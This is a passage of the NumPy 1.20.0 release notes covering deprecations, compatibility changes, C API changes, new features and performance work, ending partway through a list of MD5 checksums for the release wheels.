``np.cint`` (int), ``np.int_`` (long), ``np.longlong``.\n* ``np.intp`` which is 32bit on 32bit machines 64bit on 64bit machines.\n  This can be the best type to use for indexing.\n\nWhen used with ``np.dtype(...)`` or ``dtype=...`` changing it to the\nNumPy name as mentioned above will have no effect on the output.\nIf used as a scalar with::\n\n    np.float(123)\n\nchanging it can subtly change the result.  In this case, the Python version\n``float(123)`` or ``int(12.)`` is normally preferable, although the NumPy\nversion may be useful for consistency with NumPy arrays (for example,\nNumPy behaves differently for things like division by zero).\n\n(`gh-14882 <https://github.com/numpy/numpy/pull/14882>`__)\n\nPassing ``shape=None`` to functions with a non-optional shape argument is deprecated\n------------------------------------------------------------------------------------\nPreviously, this was an alias for passing ``shape=()``.\nThis deprecation is emitted by `PyArray_IntpConverter` in the C API. If your\nAPI is intended to support passing ``None``, then you should check for ``None``\nprior to invoking the converter, so as to be able to distinguish ``None`` and\n``()``.\n\n(`gh-15886 <https://github.com/numpy/numpy/pull/15886>`__)\n\nIndexing errors will be reported even when index result is empty\n----------------------------------------------------------------\nIn the future, NumPy will raise an IndexError when an\ninteger array index contains out of bound values even if a non-indexed\ndimension is of length 0. This will now emit a DeprecationWarning.\nThis can happen when the array is previously empty, or an empty\nslice is involved::\n\n    arr1 = np.zeros((5, 0))\n    arr1[[20]]\n    arr2 = np.zeros((5, 5))\n    arr2[[20], :0]\n\nPreviously the non-empty index ``[20]`` was not checked for correctness.\nIt will now be checked causing a deprecation warning which will be turned\ninto an error. This also applies to assignments.\n\n(`gh-15900 <https://github.com/numpy/numpy/pull/15900>`__)\n\nInexact matches for ``mode`` and ``searchside`` are deprecated\n--------------------------------------------------------------\nInexact and case insensitive matches for ``mode`` and ``searchside`` were valid\ninputs earlier and will give a DeprecationWarning now.  For example, below are\nsome example usages which are now deprecated and will give a\nDeprecationWarning::\n\n    import numpy as np\n    arr = np.array([[3, 6, 6], [4, 5, 1]])\n     mode: inexact match\n    np.ravel_multi_index(arr, (7, 6), mode=\"clap\")   should be \"clip\"\n     searchside: inexact match\n    np.searchsorted(arr[0], 4, side='random')   should be \"right\"\n\n(`gh-16056 <https://github.com/numpy/numpy/pull/16056>`__)\n\nDeprecation of `numpy.dual`\n---------------------------\nThe module `numpy.dual` is deprecated.  Instead of importing functions\nfrom `numpy.dual`, the functions should be imported directly from NumPy\nor SciPy.\n\n(`gh-16156 <https://github.com/numpy/numpy/pull/16156>`__)\n\n``outer`` and ``ufunc.outer`` deprecated for matrix\n---------------------------------------------------\n``np.matrix`` use with `~numpy.outer` or generic ufunc outer\ncalls such as ``numpy.add.outer``. Previously, matrix was\nconverted to an array here. This will not be done in the future\nrequiring a manual conversion to arrays.\n\n(`gh-16232 <https://github.com/numpy/numpy/pull/16232>`__)\n\nFurther Numeric Style types Deprecated\n--------------------------------------\n\nThe remaining numeric-style type codes ``Bytes0``, ``Str0``,\n``Uint32``, ``Uint64``, and ``Datetime64``\nhave been deprecated.  The lower-case variants should be used\ninstead.  For bytes and string ``\"S\"`` and ``\"U\"``\nare further alternatives.\n\n(`gh-16554 <https://github.com/numpy/numpy/pull/16554>`__)\n\nThe ``ndincr`` method of ``ndindex`` is deprecated\n--------------------------------------------------\nThe documentation has warned against using this function since NumPy 1.8.\nUse ``next(it)`` instead of ``it.ndincr()``.\n\n(`gh-17233 <https://github.com/numpy/numpy/pull/17233>`__)\n\nArrayLike objects which do not define ``__len__`` and ``__getitem__``\n---------------------------------------------------------------------\nObjects which define one of the protocols ``__array__``,\n``__array_interface__``, or ``__array_struct__`` but are not sequences\n(usually defined by having a ``__len__`` and ``__getitem__``) will behave\ndifferently during array-coercion in the future.\n\nWhen nested inside sequences, such as ``np.array([array_like])``, these\nwere handled as a single Python object rather than an array.\nIn the future they will behave identically to::\n\n    np.array([np.array(array_like)])\n\nThis change should only have an effect if ``np.array(array_like)`` is not 0-D.\nThe solution to this warning may depend on the object:\n\n* Some array-likes may expect the new behaviour, and users can ignore the\n  warning.  The object can choose to expose the sequence protocol to opt-in\n  to the new behaviour.\n* For example, ``shapely`` will allow conversion to an array-like using\n  ``line.coords`` rather than ``np.asarray(line)``. Users may work around\n  the warning, or use the new convention when it becomes available.\n\nUnfortunately, using the new behaviour can only be achieved by\ncalling ``np.array(array_like)``.\n\nIf you wish to ensure that the old behaviour remains unchanged, please create\nan object array and then fill it explicitly, for example::\n\n    arr = np.empty(3, dtype=object)\n    arr[:] = [array_like1, array_like2, array_like3]\n\nThis will ensure NumPy knows to not enter the array-like and use it as\na object instead.\n\n(`gh-17973 <https://github.com/numpy/numpy/pull/17973>`__)\n\n\nFuture Changes\n==============\n\nArrays cannot be using subarray dtypes\n--------------------------------------\nArray creation and casting using ``np.array(arr, dtype)``\nand ``arr.astype(dtype)`` will use different logic when ``dtype``\nis a subarray dtype such as ``np.dtype(\"(2)i,\")``.\n\nFor such a ``dtype`` the following behaviour is true::\n\n    res = np.array(arr, dtype)\n\n    res.dtype is not dtype\n    res.dtype is dtype.base\n    res.shape == arr.shape + dtype.shape\n\nBut ``res`` is filled using the logic::\n\n    res = np.empty(arr.shape + dtype.shape, dtype=dtype.base)\n    res[...] = arr\n\nwhich uses incorrect broadcasting (and often leads to an error).\nIn the future, this will instead cast each element individually,\nleading to the same result as::\n\n    res = np.array(arr, dtype=np.dtype([\"f\", dtype]))[\"f\"]\n\nWhich can normally be used to opt-in to the new behaviour.\n\nThis change does not affect ``np.array(list, dtype=\"(2)i,\")`` unless the\n``list`` itself includes at least one array.  In particular, the behaviour\nis unchanged for a list of tuples.\n\n(`gh-17596 <https://github.com/numpy/numpy/pull/17596>`__)\n\n\nExpired deprecations\n====================\n\n* The deprecation of numeric style type-codes ``np.dtype(\"Complex64\")``\n  (with upper case spelling), is expired.  ``\"Complex64\"`` corresponded to\n  ``\"complex128\"`` and ``\"Complex32\"`` corresponded to ``\"complex64\"``.\n* The deprecation of ``np.sctypeNA`` and ``np.typeNA`` is expired. Both\n  have been removed from the public API. Use ``np.typeDict`` instead.\n\n  (`gh-16554 <https://github.com/numpy/numpy/pull/16554>`__)\n\n* The 14-year deprecation of ``np.ctypeslib.ctypes_load_library`` is expired.\n  Use :func:`~numpy.ctypeslib.load_library` instead, which is identical.\n\n  (`gh-17116 <https://github.com/numpy/numpy/pull/17116>`__)\n\nFinancial functions removed\n---------------------------\nIn accordance with NEP 32, the financial functions are removed\nfrom NumPy 1.20. The functions that have been removed are ``fv``,\n``ipmt``, ``irr``, ``mirr``, ``nper``, ``npv``, ``pmt``, ``ppmt``,\n``pv``, and ``rate``.  These functions are available in the\n`numpy_financial <https://pypi.org/project/numpy-financial>`_\nlibrary.\n\n(`gh-17067 <https://github.com/numpy/numpy/pull/17067>`__)\n\n\nCompatibility notes\n===================\n\n``isinstance(dtype, np.dtype)`` and not ``type(dtype) is not np.dtype``\n-----------------------------------------------------------------------\nNumPy dtypes are not direct instances of ``np.dtype`` anymore.  Code that\nmay have used ``type(dtype) is np.dtype`` will always return ``False`` and\nmust be updated to use the correct version ``isinstance(dtype, np.dtype)``.\n\nThis change also affects the C-side macro ``PyArray_DescrCheck`` if compiled\nagainst a NumPy older than 1.16.6. If code uses this macro and wishes to\ncompile against an older version of NumPy, it must replace the macro\n(see also `C API changes`_ section).\n\n\nSame kind casting in concatenate with ``axis=None``\n---------------------------------------------------\nWhen `~numpy.concatenate` is called with ``axis=None``,\nthe flattened arrays were cast with ``unsafe``. Any other axis\nchoice uses \"same kind\". That different default\nhas been deprecated and \"same kind\" casting will be used\ninstead. The new ``casting`` keyword argument\ncan be used to retain the old behaviour.\n\n(`gh-16134 <https://github.com/numpy/numpy/pull/16134>`__)\n\nNumPy Scalars are cast when assigned to arrays\n----------------------------------------------\n\nWhen creating or assigning to arrays, in all relevant cases NumPy\nscalars will now be cast identically to NumPy arrays.  In particular\nthis changes the behaviour in some cases which previously raised an\nerror::\n\n    np.array([np.float64(np.nan)], dtype=np.int64)\n\nwill succeed and return an undefined result (usually the smallest possible\ninteger).  This also affects assignments::\n\n    arr[0] = np.float64(np.nan)\n\nAt this time, NumPy retains the behaviour for::\n\n    np.array(np.float64(np.nan), dtype=np.int64)\n\nThe above changes do not affect Python scalars::\n\n    np.array([float(\"NaN\")], dtype=np.int64)\n\nremains unaffected (``np.nan`` is a Python ``float``, not a NumPy one).\nUnlike signed integers, unsigned integers do not retain this special case,\nsince they always behaved more like casting.\nThe following code stops raising an error::\n\n    np.array([np.float64(np.nan)], dtype=np.uint64)\n\nTo avoid backward compatibility issues, at this time assignment from\n``datetime64`` scalar to strings of too short length remains supported.\nThis means that ``np.asarray(np.datetime64(\"2020-10-10\"), dtype=\"S5\")``\nsucceeds now, when it failed before.  In the long term this may be\ndeprecated or the unsafe cast may be allowed generally to make assignment\nof arrays and scalars behave consistently.\n\n\nArray coercion changes when Strings and other types are mixed\n-------------------------------------------------------------\n\nWhen strings and other types are mixed, such as::\n\n    np.array([\"string\", np.float64(3.)], dtype=\"S\")\n\nThe results will change, which may lead to string dtypes with longer strings\nin some cases.  In particularly, if ``dtype=\"S\"`` is not provided any numerical\nvalue will lead to a string results long enough to hold all possible numerical\nvalues. (e.g. \"S32\" for floats).  Note that you should always provide\n``dtype=\"S\"`` when converting non-strings to strings.\n\nIf ``dtype=\"S\"`` is provided the results will be largely identical to before,\nbut NumPy scalars (not a Python float like ``1.0``), will still enforce\na uniform string length::\n\n    np.array([np.float64(3.)], dtype=\"S\")   gives \"S32\"\n    np.array([3.0], dtype=\"S\")   gives \"S3\"\n\nPreviously the first version gave the same result as the second.\n\n\nArray coercion restructure\n--------------------------\n\nArray coercion has been restructured.  In general, this should not affect\nusers.  In extremely rare corner cases where array-likes are nested::\n\n    np.array([array_like1])\n\nThings will now be more consistent with::\n\n    np.array([np.array(array_like1)])\n\nThis can subtly change output for some badly defined array-likes.\nOne example for this are array-like objects which are not also sequences\nof matching shape.\nIn NumPy 1.20, a warning will be given when an array-like is not also a\nsequence (but behaviour remains identical, see deprecations).\nIf an array like is also a sequence (defines ``__getitem__`` and ``__len__``)\nNumPy will now only use the result given by ``__array__``,\n``__array_interface__``, or ``__array_struct__``. This will result in\ndifferences when the (nested) sequence describes a different shape.\n\n(`gh-16200 <https://github.com/numpy/numpy/pull/16200>`__)\n\nWriting to the result of `numpy.broadcast_arrays` will export readonly buffers\n------------------------------------------------------------------------------\n\nIn NumPy 1.17 `numpy.broadcast_arrays` started warning when the resulting array\nwas written to. This warning was skipped when the array was used through the\nbuffer interface (e.g. ``memoryview(arr)``). The same thing will now occur for the\ntwo protocols ``__array_interface__``, and ``__array_struct__`` returning read-only\nbuffers instead of giving a warning.\n\n(`gh-16350 <https://github.com/numpy/numpy/pull/16350>`__)\n\nNumeric-style type names have been removed from type dictionaries\n-----------------------------------------------------------------\n\nTo stay in sync with the deprecation for ``np.dtype(\"Complex64\")``\nand other numeric-style (capital case) types.  These were removed\nfrom ``np.sctypeDict`` and ``np.typeDict``.  You should use\nthe lower case versions instead.  Note that ``\"Complex64\"``\ncorresponds to ``\"complex128\"`` and ``\"Complex32\"`` corresponds\nto ``\"complex64\"``.  The numpy style (new) versions, denote the full\nsize and not the size of the real/imaginary part.\n\n(`gh-16554 <https://github.com/numpy/numpy/pull/16554>`__)\n\nThe ``operator.concat`` function now raises TypeError for array arguments\n-------------------------------------------------------------------------\nThe previous behavior was to fall back to addition and add the two arrays,\nwhich was thought to be unexpected behavior for a concatenation function.\n\n(`gh-16570 <https://github.com/numpy/numpy/pull/16570>`__)\n\n``nickname`` attribute removed from ABCPolyBase\n-----------------------------------------------\n\nAn abstract property ``nickname`` has been removed from  ``ABCPolyBase`` as it\nwas no longer used in the derived convenience classes.\nThis may affect users who have derived classes from ``ABCPolyBase`` and\noverridden the methods for representation and display, e.g. ``__str__``,\n``__repr__``, ``_repr_latex``, etc.\n\n(`gh-16589 <https://github.com/numpy/numpy/pull/16589>`__)\n\n``float->timedelta`` and ``uint64->timedelta`` promotion will raise a TypeError\n-------------------------------------------------------------------------------\nFloat and timedelta promotion consistently raises a TypeError.\n``np.promote_types(\"float32\", \"m8\")`` aligns with\n``np.promote_types(\"m8\", \"float32\")`` now and both raise a TypeError.\nPreviously, ``np.promote_types(\"float32\", \"m8\")`` returned ``\"m8\"`` which\nwas considered a bug.\n\nUint64 and timedelta promotion consistently raises a TypeError.\n``np.promote_types(\"uint64\", \"m8\")`` aligns with\n``np.promote_types(\"m8\", \"uint64\")`` now and both raise a TypeError.\nPreviously, ``np.promote_types(\"uint64\", \"m8\")`` returned ``\"m8\"`` which\nwas considered a bug.\n\n(`gh-16592 <https://github.com/numpy/numpy/pull/16592>`__)\n\n``numpy.genfromtxt`` now correctly unpacks structured arrays\n------------------------------------------------------------\nPreviously, `numpy.genfromtxt` failed to unpack if it was called with\n``unpack=True`` and a structured datatype was passed to the ``dtype`` argument\n(or ``dtype=None`` was passed and a structured datatype was inferred).\nFor example::\n\n    >>> data = StringIO(\"21 58.0\\n35 72.0\")\n    >>> np.genfromtxt(data, dtype=None, unpack=True)\n    array([(21, 58.), (35, 72.)], dtype=[('f0', '<i8'), ('f1', '<f8')])\n\nStructured arrays will now correctly unpack into a list of arrays,\none for each column::\n\n    >>> np.genfromtxt(data, dtype=None, unpack=True)\n    [array([21, 35]), array([58., 72.])]\n\n(`gh-16650 <https://github.com/numpy/numpy/pull/16650>`__)\n\n``mgrid``, ``r_``, etc. consistently return correct outputs for non-default precision input\n-------------------------------------------------------------------------------------------\nPreviously, ``np.mgrid[np.float32(0.1):np.float32(0.35):np.float32(0.1),]``\nand ``np.r_[0:10:np.complex64(3j)]`` failed to return meaningful output.\nThis bug potentially affects `~numpy.mgrid`, `~numpy.ogrid`, `~numpy.r_`,\nand `~numpy.c_` when an input with dtype other than the default\n``float64`` and ``complex128`` and equivalent Python types were used.\nThe methods have been fixed to handle varying precision correctly.\n\n(`gh-16815 <https://github.com/numpy/numpy/pull/16815>`__)\n\nBoolean array indices with mismatching shapes now properly give ``IndexError``\n------------------------------------------------------------------------------\n\nPreviously, if a boolean array index matched the size of the indexed array but\nnot the shape, it was incorrectly allowed in some cases. In other cases, it\ngave an error, but the error was incorrectly a ``ValueError`` with a message\nabout broadcasting instead of the correct ``IndexError``.\n\nFor example, the following used to incorrectly give ``ValueError: operands\ncould not be broadcast together with shapes (2,2) (1,4)``:\n\n.. code:: python\n\n   np.empty((2, 2))[np.array([[True, False, False, False]])]\n\nAnd the following used to incorrectly return ``array([], dtype=float64)``:\n\n.. code:: python\n\n   np.empty((2, 2))[np.array([[False, False, False, False]])]\n\nBoth now correctly give ``IndexError: boolean index did not match indexed\narray along dimension 0; dimension is 2 but corresponding boolean dimension is\n1``.\n\n(`gh-17010 <https://github.com/numpy/numpy/pull/17010>`__)\n\nCasting errors interrupt Iteration\n----------------------------------\nWhen iterating while casting values, an error may stop the iteration\nearlier than before. In any case, a failed casting operation always\nreturned undefined, partial results. Those may now be even more\nundefined and partial.\nFor users of the ``NpyIter`` C-API such cast errors will now\ncause the `iternext()` function to return 0 and thus abort\niteration.\nCurrently, there is no API to detect such an error directly.\nIt is necessary to check ``PyErr_Occurred()``, which\nmay be problematic in combination with ``NpyIter_Reset``.\nThese issues always existed, but new API could be added\nif required by users.\n\n(`gh-17029 <https://github.com/numpy/numpy/pull/17029>`__)\n\nf2py generated code may return unicode instead of byte strings\n--------------------------------------------------------------\nSome byte strings previously returned by f2py generated code may now be unicode\nstrings. This results from the ongoing Python2 -> Python3 cleanup.\n\n(`gh-17068 <https://github.com/numpy/numpy/pull/17068>`__)\n\nThe first element of the ``__array_interface__[\"data\"]`` tuple  must be an integer\n----------------------------------------------------------------------------------\nThis has been the documented interface for many years, but there was still\ncode that would accept a byte string representation of the pointer address.\nThat code has been removed, passing the address as a byte string will now\nraise an error.\n\n(`gh-17241 <https://github.com/numpy/numpy/pull/17241>`__)\n\npoly1d respects the dtype of all-zero argument\n----------------------------------------------\nPreviously, constructing an instance of ``poly1d`` with all-zero\ncoefficients would cast the coefficients to ``np.float64``.\nThis affected the output dtype of methods which construct\n``poly1d`` instances internally, such as ``np.polymul``.\n\n(`gh-17577 <https://github.com/numpy/numpy/pull/17577>`__)\n\nThe numpy.i file for swig is Python 3 only.\n-------------------------------------------\nUses of Python 2.7 C-API functions have been updated to Python 3 only. Users\nwho need the old version should take it from an older version of NumPy.\n\n(`gh-17580 <https://github.com/numpy/numpy/pull/17580>`__)\n\nVoid dtype discovery in ``np.array``\n------------------------------------\nIn calls using ``np.array(..., dtype=\"V\")``, ``arr.astype(\"V\")``,\nand similar a TypeError will now be correctly raised unless all\nelements have the identical void length. An example for this is::\n\n     np.array([b\"1\", b\"12\"], dtype=\"V\")\n\nWhich previously returned an array with dtype ``\"V2\"`` which\ncannot represent ``b\"1\"`` faithfully.\n\n(`gh-17706 <https://github.com/numpy/numpy/pull/17706>`__)\n\n\nC API changes\n=============\n\nThe ``PyArray_DescrCheck`` macro is modified\n--------------------------------------------\nThe ``PyArray_DescrCheck`` macro has been updated since NumPy 1.16.6 to be::\n\n    define PyArray_DescrCheck(op) PyObject_TypeCheck(op, &PyArrayDescr_Type)\n\nStarting with NumPy 1.20 code that is compiled against an earlier version\nwill be API incompatible with NumPy 1.20.\nThe fix is to either compile against 1.16.6 (if the NumPy 1.16 release is\nthe oldest release you wish to support), or manually inline the macro by\nreplacing it with the new definition::\n\n    PyObject_TypeCheck(op, &PyArrayDescr_Type)\n\nwhich is compatible with all NumPy versions.\n\n\nSize of ``np.ndarray`` and ``np.void_`` changed\n-----------------------------------------------\nThe size of the ``PyArrayObject`` and ``PyVoidScalarObject``\nstructures have changed.  The following header definition has been\nremoved::\n\n    define NPY_SIZEOF_PYARRAYOBJECT (sizeof(PyArrayObject_fields))\n\nsince the size must not be considered a compile time constant: it will\nchange for different runtime versions of NumPy.\n\nThe most likely relevant use are potential subclasses written in C which\nwill have to be recompiled and should be updated.  Please see the\ndocumentation for :c:type:`PyArrayObject` for more details and contact\nthe NumPy developers if you are affected by this change.\n\nNumPy will attempt to give a graceful error but a program expecting a\nfixed structure size may have undefined behaviour and likely crash.\n\n(`gh-16938 <https://github.com/numpy/numpy/pull/16938>`__)\n\n\nNew Features\n============\n\n``where`` keyword argument for ``numpy.all`` and ``numpy.any`` functions\n------------------------------------------------------------------------\nThe keyword argument ``where`` is added and allows to only consider specified\nelements or subaxes from an array in the Boolean evaluation of ``all`` and\n``any``. This new keyword is available to the functions ``all`` and ``any``\nboth via ``numpy`` directly or in the methods of ``numpy.ndarray``.\n\nAny broadcastable Boolean array or a scalar can be set as ``where``. It\ndefaults to ``True`` to evaluate the functions for all elements in an array if\n``where`` is not set by the user. Examples are given in the documentation of\nthe functions.\n\n\n``where`` keyword argument for ``numpy`` functions ``mean``, ``std``, ``var``\n-----------------------------------------------------------------------------\nThe keyword argument ``where`` is added and allows to limit the scope in the\ncalculation of ``mean``, ``std`` and ``var`` to only a subset of elements. It\nis available both via ``numpy`` directly or in the methods of\n``numpy.ndarray``.\n\nAny broadcastable Boolean array or a scalar can be set as ``where``. It\ndefaults to ``True`` to evaluate the functions for all elements in an array if\n``where`` is not set by the user. Examples are given in the documentation of\nthe functions.\n\n(`gh-15852 <https://github.com/numpy/numpy/pull/15852>`__)\n\n``norm=backward``, ``forward`` keyword options for ``numpy.fft`` functions\n--------------------------------------------------------------------------\nThe keyword argument option ``norm=backward`` is added as an alias for ``None``\nand acts as the default option; using it has the direct transforms unscaled\nand the inverse transforms scaled by ``1/n``.\n\nUsing the new keyword argument option ``norm=forward`` has the direct\ntransforms scaled by ``1/n`` and the inverse transforms unscaled (i.e. exactly\nopposite to the default option ``norm=backward``).\n\n(`gh-16476 <https://github.com/numpy/numpy/pull/16476>`__)\n\nNumPy is now typed\n------------------\nType annotations have been added for large parts of NumPy. There is\nalso a new `numpy.typing` module that contains useful types for\nend-users. The currently available types are\n\n- ``ArrayLike``: for objects that can be coerced to an array\n- ``DtypeLike``: for objects that can be coerced to a dtype\n\n(`gh-16515 <https://github.com/numpy/numpy/pull/16515>`__)\n\n``numpy.typing`` is accessible at runtime\n-----------------------------------------\nThe types in ``numpy.typing`` can now be imported at runtime. Code\nlike the following will now work:\n\n.. code:: python\n\n    from numpy.typing import ArrayLike\n    x: ArrayLike = [1, 2, 3, 4]\n\n(`gh-16558 <https://github.com/numpy/numpy/pull/16558>`__)\n\nNew ``__f2py_numpy_version__`` attribute for f2py generated modules.\n--------------------------------------------------------------------\nBecause f2py is released together with NumPy, ``__f2py_numpy_version__``\nprovides a way to track the version f2py used to generate the module.\n\n(`gh-16594 <https://github.com/numpy/numpy/pull/16594>`__)\n\n``mypy`` tests can be run via runtests.py\n-----------------------------------------\nCurrently running mypy with the NumPy stubs configured requires\neither:\n\n* Installing NumPy\n* Adding the source directory to MYPYPATH and linking to the ``mypy.ini``\n\nBoth options are somewhat inconvenient, so add a ``--mypy`` option to runtests\nthat handles setting things up for you. This will also be useful in the future\nfor any typing codegen since it will ensure the project is built before type\nchecking.\n\n(`gh-17123 <https://github.com/numpy/numpy/pull/17123>`__)\n\nNegation of user defined BLAS/LAPACK detection order\n----------------------------------------------------\n`~numpy.distutils` allows negation of libraries when determining BLAS/LAPACK\nlibraries.\nThis may be used to remove an item from the library resolution phase, i.e.\nto disallow NetLIB libraries one could do:\n\n.. code:: bash\n\n    NPY_BLAS_ORDER='^blas' NPY_LAPACK_ORDER='^lapack' python setup.py build\n\nThat will use any of the accelerated libraries instead.\n\n(`gh-17219 <https://github.com/numpy/numpy/pull/17219>`__)\n\nAllow passing optimizations arguments to asv build\n--------------------------------------------------\nIt is now possible to pass  ``-j``, ``--cpu-baseline``, ``--cpu-dispatch`` and\n``--disable-optimization`` flags to ASV build when the ``--bench-compare``\nargument is used.\n\n(`gh-17284 <https://github.com/numpy/numpy/pull/17284>`__)\n\nThe NVIDIA HPC SDK nvfortran compiler is now supported\n------------------------------------------------------\nSupport for the nvfortran compiler, a version of pgfortran, has been added.\n\n(`gh-17344 <https://github.com/numpy/numpy/pull/17344>`__)\n\n``dtype`` option for ``cov`` and ``corrcoef``\n---------------------------------------------\nThe ``dtype`` option is now available for `numpy.cov` and `numpy.corrcoef`.\nIt specifies which data-type the returned result should have.\nBy default the functions still return a `numpy.float64` result.\n\n(`gh-17456 <https://github.com/numpy/numpy/pull/17456>`__)\n\n\nImprovements\n============\n\nImproved string representation for polynomials (``__str__``)\n------------------------------------------------------------\n\nThe string representation (``__str__``) of all six polynomial types in\n`numpy.polynomial` has been updated to give the polynomial as a mathematical\nexpression instead of an array of coefficients. Two package-wide formats for\nthe polynomial expressions are available - one using Unicode characters for\nsuperscripts and subscripts, and another using only ASCII characters.\n\n(`gh-15666 <https://github.com/numpy/numpy/pull/15666>`__)\n\nRemove the Accelerate library as a candidate LAPACK library\n-----------------------------------------------------------\nApple no longer supports Accelerate. Remove it.\n\n(`gh-15759 <https://github.com/numpy/numpy/pull/15759>`__)\n\nObject arrays containing multi-line objects have a more readable ``repr``\n-------------------------------------------------------------------------\nIf elements of an object array have a ``repr`` containing new lines, then the\nwrapped lines will be aligned by column. Notably, this improves the ``repr`` of\nnested arrays::\n\n    >>> np.array([np.eye(2), np.eye(3)], dtype=object)\n    array([array([[1., 0.],\n                  [0., 1.]]),\n           array([[1., 0., 0.],\n                  [0., 1., 0.],\n                  [0., 0., 1.]])], dtype=object)\n\n(`gh-15997 <https://github.com/numpy/numpy/pull/15997>`__)\n\nConcatenate supports providing an output dtype\n----------------------------------------------\nSupport was added to `~numpy.concatenate` to provide\nan output ``dtype`` and ``casting`` using keyword\narguments. The ``dtype`` argument cannot be provided\nin conjunction with the ``out`` one.\n\n(`gh-16134 <https://github.com/numpy/numpy/pull/16134>`__)\n\nThread safe f2py callback functions\n-----------------------------------\n\nCallback functions in f2py are now thread safe.\n\n(`gh-16519 <https://github.com/numpy/numpy/pull/16519>`__)\n\n`numpy.core.records.fromfile` now supports file-like objects\n------------------------------------------------------------\n`numpy.rec.fromfile` can now use file-like objects, for instance\n:py:class:`io.BytesIO`\n\n(`gh-16675 <https://github.com/numpy/numpy/pull/16675>`__)\n\nRPATH support on AIX added to distutils\n---------------------------------------\nThis allows SciPy to be built on AIX.\n\n(`gh-16710 <https://github.com/numpy/numpy/pull/16710>`__)\n\nUse f90 compiler specified by the command line args\n---------------------------------------------------\n\nThe compiler command selection for Fortran Portland Group Compiler is changed\nin `numpy.distutils.fcompiler`.  This only affects the linking command.  This\nforces the use of the executable provided by the command line option (if\nprovided) instead of the pgfortran executable.  If no executable is provided to\nthe command line option it defaults to the pgf90 executable, wich is an alias\nfor pgfortran according to the PGI documentation.\n\n(`gh-16730 <https://github.com/numpy/numpy/pull/16730>`__)\n\nAdd NumPy declarations for Cython 3.0 and later\n-----------------------------------------------\n\nThe pxd declarations for Cython 3.0 were improved to avoid using deprecated\nNumPy C-API features.  Extension modules built with Cython 3.0+ that use NumPy\ncan now set the C macro ``NPY_NO_DEPRECATED_API=NPY_1_7_API_VERSION`` to avoid\nC compiler warnings about deprecated API usage.\n\n(`gh-16986 <https://github.com/numpy/numpy/pull/16986>`__)\n\nMake the window functions exactly symmetric\n-------------------------------------------\nMake sure the window functions provided by NumPy are symmetric. There were\npreviously small deviations from symmetry due to numerical precision that are\nnow avoided by better arrangement of the computation.\n\n(`gh-17195 <https://github.com/numpy/numpy/pull/17195>`__)\n\n\nPerformance improvements and changes\n====================================\n\nEnable multi-platform SIMD compiler optimizations\n-------------------------------------------------\n\nA series of improvements for NumPy infrastructure to pave the way to\n**NEP-38**, that can be summarized as follow:\n\n-  **New Build Arguments**\n\n   -  ``--cpu-baseline`` to specify the minimal set of required\n      optimizations, default value is ``min`` which provides the minimum\n      CPU features that can safely run on a wide range of users\n      platforms.\n\n   -  ``--cpu-dispatch`` to specify the dispatched set of additional\n      optimizations, default value is ``max -xop -fma4`` which enables\n      all CPU features, except for AMD legacy features.\n\n   -  ``--disable-optimization`` to explicitly disable the whole new\n      improvements, It also adds a new **C** compiler definition\n      called ``NPY_DISABLE_OPTIMIZATION`` which it can be used as\n      guard for any SIMD code.\n\n-  **Advanced CPU dispatcher**\n\n   A flexible cross-architecture CPU dispatcher built on the top of\n   Python/Numpy distutils, support all common compilers with a wide range of\n   CPU features.\n\n   The new dispatcher requires a special file extension ``*.dispatch.c`` to\n   mark the dispatch-able **C** sources. These sources have the ability to be\n   compiled multiple times so that each compilation process represents certain\n   CPU features and provides different definitions and flags that affect the\n   code paths.\n\n-  **New auto-generated C header ``core/src/common/_cpu_dispatch.h``**\n\n   This header is generated by the distutils module ``ccompiler_opt``, and\n   contains all the definitions and headers of instruction sets, that had been\n   configured through command arguments '--cpu-baseline' and '--cpu-dispatch'.\n\n-  **New C header ``core/src/common/npy_cpu_dispatch.h``**\n\n   This header contains all utilities that required for the whole CPU\n   dispatching process, it also can be considered as a bridge linking the new\n   infrastructure work with NumPy CPU runtime detection.\n\n-  **Add new attributes to NumPy umath module(Python level)**\n\n   - ``__cpu_baseline__`` a list contains the minimal set of required\n     optimizations that supported by the compiler and platform according to the\n     specified values to command argument '--cpu-baseline'.\n\n   - ``__cpu_dispatch__`` a list contains the dispatched set of additional\n     optimizations that supported by the compiler and platform according to the\n     specified values to command argument '--cpu-dispatch'.\n\n-  **Print the supported CPU features during the run of PytestTester**\n\n(`gh-13516 <https://github.com/numpy/numpy/pull/13516>`__)\n\n\nChanges\n=======\n\nChanged behavior of ``divmod(1., 0.)`` and related functions\n------------------------------------------------------------\nThe changes also assure that different compiler versions have the same behavior\nfor nan or inf usages in these operations. This was previously compiler\ndependent, we now force the invalid and divide by zero flags, making the\nresults the same across compilers. For example, gcc-5, gcc-8, or gcc-9 now\nresult in the same behavior. The changes are tabulated below:\n\n.. list-table:: Summary of New Behavior\n   :widths: auto\n   :header-rows: 1\n\n   * - Operator\n     - Old Warning\n     - New Warning\n     - Old Result\n     - New Result\n     - Works on MacOS\n   * - np.divmod(1.0, 0.0)\n     - Invalid\n     - Invalid and Dividebyzero\n     - nan, nan\n     - inf, nan\n     - Yes\n   * - np.fmod(1.0, 0.0)\n     - Invalid\n     - Invalid\n     - nan\n     - nan\n     - No? Yes\n   * - np.floor_divide(1.0, 0.0)\n     - Invalid\n     - Dividebyzero\n     - nan\n     - inf\n     - Yes\n   * - np.remainder(1.0, 0.0)\n     - Invalid\n     - Invalid\n     - nan\n     - nan\n     - Yes\n\n(`gh-16161 <https://github.com/numpy/numpy/pull/16161>`__)\n\n``np.linspace`` on integers now uses floor\n------------------------------------------\nWhen using a ``int`` dtype in `numpy.linspace`, previously float values would\nbe rounded towards zero. Now `numpy.floor` is used instead, which rounds toward\n``-inf``. This changes the results for negative values. For example, the\nfollowing would previously give::\n\n    >>> np.linspace(-3, 1, 8, dtype=int)\n    array([-3, -2, -1, -1,  0,  0,  0,  1])\n\nand now results in::\n\n    >>> np.linspace(-3, 1, 8, dtype=int)\n    array([-3, -3, -2, -2, -1, -1,  0,  1])\n\nThe former result can still be obtained with::\n\n    >>> np.linspace(-3, 1, 8).astype(int)\n    array([-3, -2, -1, -1,  0,  0,  0,  1])\n\n(`gh-16841 <https://github.com/numpy/numpy/pull/16841>`__)\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    6f43f51475706d8346cee9604ed54e8a  numpy-1.20.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    c77f563595ab4bab6185c795c573a26a  numpy-1.20.0-cp37-cp37m-manylinux1_i686.whl\n    e8f71fdb7e4e837ae79894b621e3ca08  numpy-1.20.0-cp37-cp37m-manylinux1_x86_64.whl\n    89c477a3eaf2e3379aa21bf80e2a2812  numpy-1.20.0-cp37-cp37m-manylinux2010_i686.whl\n 